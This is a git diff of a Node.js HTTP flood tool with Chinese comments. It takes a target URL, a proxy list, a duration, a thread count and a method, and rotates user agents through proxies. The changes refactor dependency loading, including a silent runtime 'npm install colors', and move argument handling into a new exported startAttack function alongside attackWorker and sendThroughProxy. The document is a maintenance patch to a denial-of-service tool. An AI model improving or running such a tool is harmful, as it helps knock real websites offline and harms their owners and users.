@@ -2,18 +2,40 @@
 
 // ---------- 自动安装依赖 ----------
 const { execSync } = require('child_process');
+let colors;
 try {
-  require('colors');
+  colors = require('colors');
 } catch (err) {
   console.log('\x1b[36m[安装]\x1b[37m 正在安装依赖...'.yellow);
   try {
     execSync('npm install colors', { stdio: 'inherit' });
-    console.log('✅ \x1b[32m依赖安装完成\x1b[37m'.green);
+    console.log('✅ \x1b[32m依赖安装完成，继续执行\x1b[37m'.green);
+    // 重新加载模块
+    colors = require('colors');
   } catch (e) {
-    console.log('⚠️  \x1b[33m使用基础颜色输出\x1b[37m'.yellow);
+    console.log('⚠️  \x1b[33m安装colors失败，使用基础颜色输出\x1b[37m'.yellow);
+    // 创建一个简单的颜色替代对象
+    colors = {
+      yellow: (str) => `\x1b[33m${str}\x1b[37m`,
+      red: (str) => `\x1b[31m${str}\x1b[37m`,
+      green: (str) => `\x1b[32m${str}\x1b[37m`,
+      cyan: (str) => `\x1b[36m${str}\x1b[37m`,
+      magenta: (str) => `\x1b[35m${str}\x1b[37m`,
+      blue: (str) => `\x1b[34m${str}\x1b[37m`,
+    };
   }
-  console.log('请重新运行脚本');
-  process.exit(1);
+}
+
+// ---------- 设置颜色主题 ----------
+if (colors.setTheme) {
+  colors.setTheme({
+    info: 'cyan',
+    warn: 'yellow',
+    error: 'red',
+    success: 'green',
+    attack: 'magenta',
+    stats: 'blue'
+  });
 }
 
 // ---------- 错误处理 ----------
@@ -34,17 +56,6 @@ const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
 
-// ---------- 颜色初始化 ----------
-const colors = require('colors');
-colors.setTheme({
-  info: 'cyan',
-  warn: 'yellow',
-  error: 'red',
-  success: 'green',
-  attack: 'magenta',
-  stats: 'blue'
-});
-
 // ---------- 常量定义 ----------
 const fileName = path.basename(__filename);
 const UAs = [
@@ -62,15 +73,27 @@ const UAs = [
 
 // ---------- 主程序 ----------
 function main() {
-  // 检查参数
-  if (process.argv.length < 6) {
+  // 检查是否从命令行调用且有参数
+  const isCLI = require.main === module;
+  const hasArgs = process.argv.length > 2;
+  
+  // 如果没有参数且是命令行调用，显示用法
+  if (isCLI && !hasArgs) {
     console.log('\n\x1b[31m[错误]\x1b[37m 参数不足'.error);
     console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> <代理文件> <持续时间> <线程数> <方法>'.info);
     console.log('\x1b[33m[示例]\x1b[37m node ' + fileName + ' http://example.com proxies.txt 60 100 GET'.warn);
     console.log('\x1b[33m[注意]\x1b[37m 代理文件格式: 每行一个代理 (ip:端口)'.warn);
     process.exit(1);
   }
+  
+  // 如果有参数，开始执行
+  if (hasArgs) {
+    startAttack();
+  }
+}
 
+// ---------- 启动攻击 ----------
+function startAttack() {
   const target = process.argv[2];
   const proxyFile = process.argv[3];
   const duration = parseInt(process.argv[4]);
@@ -80,6 +103,7 @@ function main() {
   // 参数验证
   if (!target || !proxyFile || !duration || !threads) {
     console.log('\x1b[31m[错误]\x1b[37m 所有参数都是必须的'.error);
+    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> <代理文件> <持续时间> <线程数> <方法>'.info);
     process.exit(1);
   }
 
@@ -131,7 +155,7 @@ function main() {
     console.log(`\x1b[36m[加载]\x1b[37m 成功加载 ${proxies.length} 个代理`.info);
   } catch (err) {
     if (err.code === 'ENOENT') {
-      console.log('\x1b[31m[错误]\x1b[37m 代理文件不存在'.error);
+      console.log('\x1b[31m[错误]\x1b[37m 代理文件不存在: ' + proxyFile.error);
     } else {
       console.log('\x1b[31m[错误]\x1b[37m 读取代理文件失败: ' + err.message.error);
     }
@@ -172,7 +196,7 @@ function main() {
         totalRequests += sent;
         failedRequests += failed;
       });
-    }, Math.random() * 1000); // 随机延迟启动，避免同时发起大量连接
+    }, Math.random() * 1000); // 随机延迟启动
   }
 
   // 显示实时统计
@@ -403,6 +427,7 @@ if (require.main === module) {
 // ---------- 模块导出 ----------
 module.exports = {
   main,
+  startAttack,
   attackWorker,
   sendThroughProxy,
   sendDirectRequest
